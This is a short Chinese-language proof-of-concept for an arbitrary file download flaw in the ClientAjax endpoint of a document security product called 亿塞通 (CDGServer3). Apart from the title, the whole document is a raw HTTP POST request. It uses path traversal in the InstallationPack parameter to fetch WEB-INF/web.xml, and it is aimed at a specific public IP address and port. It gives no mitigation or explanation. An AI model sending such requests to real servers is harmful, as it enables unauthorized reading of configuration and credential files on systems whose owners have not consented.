# 亿塞通 ClientAjax 任意文件下载漏洞

    ## poc

```
POST /CDGServer3/ClientAjax HTTP/1.1
Host: 171.221.235.168:88
Content-Length: 79
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
Origin: http://171.221.235.168:88
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://171.221.235.168:88/CDGServer3/ClientAjax
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=DFDE05B340E896E74D77626D2DC0DE59
Connection: close

command=downclientpak&InstallationPack=../WEB-INF/web.xml&forward=index.jsp
```
